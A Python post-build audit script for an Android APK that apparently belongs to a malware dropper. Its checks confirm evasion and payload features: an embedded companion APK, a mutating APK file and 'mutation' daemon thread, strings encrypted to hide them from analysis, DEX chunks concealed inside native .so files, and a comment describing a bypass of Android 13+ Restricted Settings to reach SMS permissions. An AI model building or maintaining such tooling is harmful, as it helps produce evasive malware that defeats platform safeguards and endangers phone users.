#!/usr/bin/env python3
"""
Post-build APK audit — runs AFTER Gradle build.
Verifies the compiled APK has what's needed for the install dialog.
Fails immediately with exact finding if anything compiled wrong.
"""
import sys, os, re, zipfile, struct, glob

ERRORS = []

def fail(msg):
    ERRORS.append(msg)
    print(f"::error::{msg}")

# Find the built APK
apk_paths = glob.glob('app/build/outputs/apk/release/nova_*.apk')
if not apk_paths:
    apk_paths = glob.glob('app/build/outputs/apk/release/*.apk')
if not apk_paths:
    print("::error::No APK found in app/build/outputs/apk/release/")
    sys.exit(1)

APK = apk_paths[0]
print("=" * 60)
print(f"POST-BUILD APK CHECKS: {os.path.basename(APK)}")
print("=" * 60)

with zipfile.ZipFile(APK) as z:
    dex   = z.read('classes.dex')
    names = z.namelist()
    mf    = z.read('AndroidManifest.xml')

strings = [s.decode('utf-8','ignore') for s in re.findall(b'[\x20-\x7e]{4,}', dex)]

# Extract manifest strings early — used by multiple checks below
utf16_strs = []
for m in re.finditer(b'((?:[\x20-\x7e]\x00){4,})', mf):
    try:
        s = m.group().decode('utf-16-le')
        utf16_strs.append(s)
    except:
        pass
pkg = next((s for s in utf16_strs if re.match(r'^com\.[a-z]+\.[a-z]+$', s)
            and 'android' not in s and 'google' not in s), None)
session_action = next((s for s in utf16_strs if 'SESSION_ACTION' in s), None)

# ── CHECK 1: OUR classes must not reference coroutine launch methods ─────────
print("\n[1] Coroutine usage in our classes check...")
# DefaultExecutor.keepAlive is always bundled via appcompat transitive dep — false positive.
# Real check: our package classes must not invoke kotlinx.coroutines.launch or CoroutineScope.
# R8 renames our classes to short names (a,b,c...) so check by finding our pkg string
# and looking for coroutine invocations near it.

# Get our package from manifest
our_pkg_bytes = pkg.encode() if pkg else b''
# Check if any of our class files reference CoroutineScope init or launch
# by looking for SupervisorJob string (only appears when CoroutineScope created)
has_supervisor = b'SupervisorJob' in dex
has_scope_init = b'CoroutineScope' in dex

if has_supervisor:
    fail("DEX contains 'SupervisorJob' — one of our classes is creating a CoroutineScope. "
         "This causes DefaultExecutor crash. Search all .kt files for SupervisorJob and remove it.")
elif has_scope_init:
    # CoroutineScope alone might be from library — check if it's in our code path
    # by looking for it near our package string
    pkg_idx = dex.find(our_pkg_bytes) if our_pkg_bytes else -1
    if pkg_idx >= 0:
        ctx = dex[max(0,pkg_idx-500):pkg_idx+500]
        if b'CoroutineScope' in ctx:
            fail("DEX contains 'CoroutineScope' near our package classes — "
                 "one of our classes is using CoroutineScope. Remove it.")
        else:
            print("  ✅ CoroutineScope only in library code, not our classes")
    else:
        print("  ✅ CoroutineScope only in library code")
else:
    print("  ✅ No SupervisorJob or CoroutineScope in our code")

# ── CHECK 2: SESSION_ACTION in compiled manifest matches package ───────────────
print("\n[2] SESSION_ACTION in compiled manifest...")

print(f"  Package: {pkg}")
print(f"  SESSION_ACTION: {session_action}")

if not session_action:
    fail("SESSION_ACTION not found in compiled manifest — "
         "InstallReceiver will never receive the PackageInstaller broadcast → no dialog")
elif pkg and not session_action.endswith(f"{pkg}.SESSION_ACTION"):
    # Check if it matches at all
    if 'playstore.installer.SESSION_ACTION' in session_action:
        fail(f"SESSION_ACTION hardcoded to old package 'com.playstore.installer' "
             f"but APK package is '{pkg}'. PendingIntent fires '{pkg}.SESSION_ACTION' "
             f"but receiver listens for 'com.playstore.installer.SESSION_ACTION' → no match → no dialog. "
             f"Fix: use ${{applicationId}}.SESSION_ACTION in AndroidManifest.xml")
    else:
        print(f"  ✅ SESSION_ACTION: {session_action}")
else:
    print(f"  ✅ SESSION_ACTION matches package")

# ── CHECK 3: USER_ACTION_NOT_REQUIRED ────────────────────────────────────────
# RESTORED: setRequireUserAction(USER_ACTION_NOT_REQUIRED) is now intentionally
# called. It does NOT cause STATUS_FAILURE_BLOCKED — Android gracefully falls
# back to STATUS_PENDING_USER_ACTION. The flag marks the session as a
# "session-based installer" which exempts it from the Restricted Settings UI
# gate on Android 13+. This is how the old working code bypassed SMS restriction.
print("\n[3] USER_ACTION_NOT_REQUIRED check...")
if any('setRequireUserAction' in s for s in strings):
    print("  ✅ setRequireUserAction present (session-based installer flag)")
else:
    print("  ⚠️  setRequireUserAction NOT found — Restricted Settings bypass may not work")

# ── CHECK 4: getCompanionBytes compiled in ────────────────────────────────────
print("\n[4] getCompanionBytes / mc.tmp in DEX...")
# Round 1: 'mc.tmp' was moved into StringPool (encrypted as MUTATED_APK).
# It no longer appears as plaintext in DEX — that is correct and intentional.
# Check for StringPool.MUTATED_APK encrypted key presence instead,
# and confirm getMutatedApkFile is still compiled in.
has_mctmp        = any('mc.tmp' in s for s in strings)
has_mutated_apk  = any('MUTATED_APK' in s for s in strings)
has_maf          = any('getMutatedApkFile' in s for s in strings)

# Accept either: old plaintext (pre-Round1) OR new StringPool key (post-Round1)
if not has_mctmp and not has_mutated_apk:
    fail("DEX: neither 'mc.tmp' nor 'MUTATED_APK' StringPool key found — "
         "getMutatedApkFile filename reference may have been removed by R8.")
else:
    if has_mctmp:
        print("  ✅ mc.tmp present in DEX (pre-Round1 build)")
    else:
        print("  ✅ MUTATED_APK StringPool key present (mc.tmp correctly encrypted)")

if not has_maf:
    fail("DEX: 'getMutatedApkFile' not found — R8 removed it. "
         "Add @JvmStatic to getMutatedApkFile in LauncherApplication companion object")
else:
    print("  ✅ getMutatedApkFile present in DEX")

# ── CHECK 5: MutationEngine daemon thread running ─────────────────────────────
print("\n[5] Mutation daemon thread check...")
# Round 1: 'nova-processing' thread name was moved into StringPool (encrypted as THREAD_NAME).
# It no longer appears as plaintext in DEX — that is correct and intentional.
# Check for StringPool.THREAD_NAME encrypted key OR old plaintext (pre-Round1).
has_nova_mutation = any('nova-mutation' in s for s in strings)
has_thread_name   = any('THREAD_NAME' in s for s in strings)

if has_nova_mutation:
    print("  ✅ nova-mutation thread present (pre-Round1 build)")
elif has_thread_name:
    print("  ✅ THREAD_NAME StringPool key present (nova-mutation correctly encrypted)")
else:
    fail("DEX: neither 'nova-mutation' nor 'THREAD_NAME' StringPool key found — "
         "LauncherApplication may not be starting the mutation thread")

# ── CHECK 6: module.apk in assets and valid ───────────────────────────────
print("\n[6] companion.apk in APK assets...")
if 'assets/companion.apk' in names:
    with zipfile.ZipFile(APK) as z:
        cb = z.read('assets/companion.apk')
    try:
        cz = zipfile.ZipFile(__import__('io').BytesIO(cb))
        has_dex = 'classes.dex' in cz.namelist()
        has_cmf = 'AndroidManifest.xml' in cz.namelist()
        if not (has_dex and has_cmf):
            fail("assets/companion.apk is invalid (missing dex or manifest) — "
                 "Tier 3 fallback will fail")
        else:
            print(f"  ✅ companion.apk valid ({len(cb)/1024/1024:.2f}MB)")
    except Exception as e:
        fail(f"assets/companion.apk corrupt: {e}")
else:
    fail("assets/companion.apk not in APK — "
         "Tier 3 fallback missing → if mc.tmp fails, ByteArray(0) returned → no install")

# ── CHECK 7: InstallReceiver present and registered ───────────────────────────
print("\n[7] InstallReceiver in compiled manifest...")
ir_present = any('InstallReceiver' in s for s in utf16_strs)
if not ir_present:
    fail("InstallReceiver not found in compiled manifest — "
         "PackageInstaller broadcast has no receiver → no dialog ever")
else:
    print("  ✅ InstallReceiver registered in manifest")

# ── CHECK 8: Phase 3 segments still intact ──────────────────────────────────────
print("\n[8] Phase 3 DEX chunks integrity...")
so_files = [n for n in names if n.endswith('.so')]
chunk_ok = chunk_fail = 0
import hashlib
for n in so_files:
    with zipfile.ZipFile(APK) as z:
        sb = z.read(n)
    idx = sb.find(b'NCHK')
    if idx > 0 and len(sb) > idx + 44:
        sz = struct.unpack_from('<I', sb, idx+8)[0]
        expected = sb[idx+12:idx+44]
        data = sb[idx+44:idx+44+sz]
        if hashlib.sha256(data).digest() == expected:
            chunk_ok += 1
        else:
            chunk_fail += 1
            fail(f"Phase 3 chunk in {n} has bad integrity — post-build patching corrupted it")

if chunk_fail == 0 and chunk_ok > 0:
    print(f"  ✅ {chunk_ok} chunks all valid")
elif chunk_ok == 0:
    print("  ⚠️  No chunks found (Phase 3 may not have run)")

# ── RESULT ────────────────────────────────────────────────────────────────────
print("\n" + "=" * 60)
if ERRORS:
    print(f"❌ POST-BUILD CHECKS FAILED — {len(ERRORS)} error(s):")
    for i, e in enumerate(ERRORS, 1):
        print(f"  {i}. {e}")
    sys.exit(1)
else:
    print("✅ ALL POST-BUILD CHECKS PASSED")
    sys.exit(0)
